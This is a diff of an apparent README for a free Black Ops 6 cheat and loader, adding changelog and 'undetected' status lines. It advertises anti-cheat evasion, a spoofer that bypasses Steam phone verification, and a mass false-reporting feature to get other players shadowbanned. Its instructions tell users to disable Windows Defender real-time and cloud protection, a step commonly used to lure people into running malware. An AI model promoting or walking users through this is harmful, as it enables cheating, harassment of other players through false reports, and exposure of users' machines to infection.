@@ -1,11 +1,13 @@
+___1/1/2025 HAPPY NEW YEAR!!___ We have fixed quite a few bugs that were causing game crashes, loader crashes, and other annoying issues. Also fixed compatibility with certain versions of Windows, so if you previously had issues, try the latest version in the Releases section! Also fixed detections with the UnlockALL function, and detections with loader injection. </br>
 ___12/25/24 MERRY CHRISTMAS!! NEW FEATURES HAVE BEEN ADDED!! We have implemented spam reporting and playername obfuscation!! This makes it so your account can't get reported by other players spectating you! Spam reporting allows you to send up to 100 reports in every category and instantly get other players shadowbanned!!___</br>
 ___12/4/24 STABILITY FIX!!! Windows 11 issues have been resolved! Currently functional on all versions of Windows 10 and 11!!___</br>
-___11/23/24 UPDATE: New Version of the loader has been released! This update fixes the Ordinal 345 missing error that some people were experiencing on launch!___</br>
 ___11/13/24 UPDATED SPOOFER!!! NO LONGER WILL YOU HAVE TO VERIFY A PHONE NUMBER TO PLAY!! THIS UPDATE BYPASSES THE PHONE VERIFICATION WHEN YOU LOG INTO A NEW ACCOUNT ON STEAM!!___</br>
 ___HUGE UPDATE!!! ANTI AIM ADDED!!!___</br>
 A little background on this project, I built this because my buddies and I got sick of paying 30$ a month for some half ass ripped cheat thats being sold by 100 other people all over Discord, paying for said cheat, and then proceeding to get banned 3 hours later for cheating because it was poorly written and easily detected. I use this cheat regulary, it is and will be one of the only free cheats for Black Ops 6 that will continually stay undetected by ricochet. We take pride in our accounts, who wants to be the craziest player in the lobby but can't show it off because they get banned every 3-4 games. Fuck that. So here we are. I hope yall enjoy!</br>
 ![showcase1](screenshots/1.png)
 ![bo6showcase](screenshots/bo6showcase1.png)
+___SPOOFER STATUS: UNDETECTED! (Last Update: 1/1/2025)___</br>
+___CHEAT STATUS: UNDETECTED! (Last Update: 1/1/2025)___</br>
 __INSTRUCTIONS FOR USE__ </br>
 ___> ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.___
 
